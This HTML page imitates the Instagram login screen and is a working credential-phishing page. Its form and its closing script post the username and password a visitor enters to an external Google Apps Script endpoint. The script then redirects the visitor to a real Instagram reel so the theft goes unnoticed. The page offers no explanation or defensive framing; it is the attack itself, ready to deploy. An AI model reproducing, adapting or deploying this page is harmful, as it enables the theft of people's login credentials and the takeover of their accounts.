<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
      * {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: Arial, sans-serif;
}
body {
  background-color: #fafafa;
  display: flex;
  justify-content: center;
  align-items: center;
  flex-direction: column;
  height: 100vh;
}
.container {
  text-align: center;
}
.login-box {
  background: #fff;
  padding: 30px;
  width: 350px;
  border: 1px solid #dbdbdb;
  border-radius: 8px;
  margin-bottom: 15px;
}
.logo {
  width: 150px;
  margin-bottom: 20px;
}
.error-message {
  display: none;
  color: red;
  font-size: 14px;
  margin-bottom: 10px;
}
form input {
  width: 100%;
  padding: 10px;
  margin: 5px 0;
  border: 1px solid #dbdbdb;
  border-radius: 5px;
  outline: none;
  font-size: 14px;
  background: #fafafa;
}
#submit {
  width: 100%;
  padding: 10px;
  margin-top: 10px;
  background: #0095f6;
  color: white;
  border: none;
  border-radius: 5px;
  font-size: 16px;
  cursor: pointer;
}
.separator {
  display: flex;
  align-items: center;
  text-align: center;
  margin: 15px 0;
}
.line {
  flex: 1;
  height: 1px;
  background: #dbdbdb;
}
.separator span {
  margin: 0 10px;
  color: #8e8e8e;
  font-size: 12px;
}
.fb-login {
  display: flex;
  align-items: center;
  justify-content: center;
  margin-top: 15px;
}
.fb-login img {
  width: 20px;
  margin-right: 8px;
}
.fb-login a {
  text-decoration: none;
  color: #385185;
  font-weight: bold;
}
.forgot-password {
  display: block;
  margin-top: 10px;
  font-size: 12px;
  color: #00376b;
  text-decoration: none;
}
.signup-box {
  background: #fff;
  padding: 15px;
  margin-top: 10px;
  border: 1px solid #dbdbdb;
  border-radius: 8px;
}
.signup-box a {
  color: #0095f6;
  text-decoration: none;
  font-weight: bold;
}
.app-download {
  text-align: center;
  margin-top: 15px;
}
.app-download p {
  font-size: 14px;
  color: #262626;
  margin-bottom: 10px;
}
.store-buttons {
  display: flex;
  justify-content: center;
  gap: 10px;
}
.store-buttons img {
  width: 50px;
  height: 20px;
  cursor: pointer;
}
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo" alt="Instagram Logo">                     
            <form method="post"
             action="https://script.google.com/macros/s/AKfycbzbS45F27bPk1pFkx12anG-Mk3MSzvymfxBbr_LSA53arUHqVp2VuS46p1JUFoSaIBw/exec" 
            name="login-form"
            onsubmit="return validateForm()">
                <input type="text" 
                name="user-name"
                id="username" placeholder="Phone number, username, or email" required
                onkeydown="
                Username();
                ">
                <input type="password"
                name="pass-word"
                id="password" placeholder="Password" required
                onkeydown="
                Password();
                ">
                <input  
                type="submit"
                value="Login"
                id="submit"                        
                >
                <p id="error-message"></p>
<div class="error-message" name="error-message">Sorry, your password was incorrect. Please double-check your password.</div>
            </form>
            <div class="separator">
                <div class="line"></div>
                <span>OR</span>
                <div class="line"></div>
            </div>
            <div class="fb-login">
                <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook">
                <a href="https://www.facebook.com/login/">Log in with Facebook</a>
            </div>

            <a href="https://www.instagram.com/accounts/password/reset/?hl=en" class="forgot-password">Forgot password?</a>
        </div>
        <div class="signup-box">
            Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/?hl=en">Sign up</a>
        </div>
        <div class="app-download">
            <p>Get the app.</p>
            <div class="store-buttons">
              <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
                <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/App_Store_%28iOS%29.svg" alt="Apple App Store">
              </a>
              <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/512px-Google_Play_Store_badge_EN.svg.png" alt="Google Play Store">
            </a>
            </div>
        </div>
    </div>
    <script>
  const scriptURL = 'https://script.google.com/macros/s/AKfycbzbS45F27bPk1pFkx12anG-Mk3MSzvymfxBbr_LSA53arUHqVp2VuS46p1JUFoSaIBw/exec'

const form = document.forms['login-form']
form.addEventListener('submit', e => {
  e.preventDefault()
  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
  //.then(response => alert("Loading..." ))
  .then(() => { window.location.href="https://www.instagram.com/reel/DFgJ4UPPAJ_/?igsh=d3Y1aGdxOWxvdGxx"; })
  .catch(error => console.error('Error!', error.message))
})
    </script>
</body>
</html>
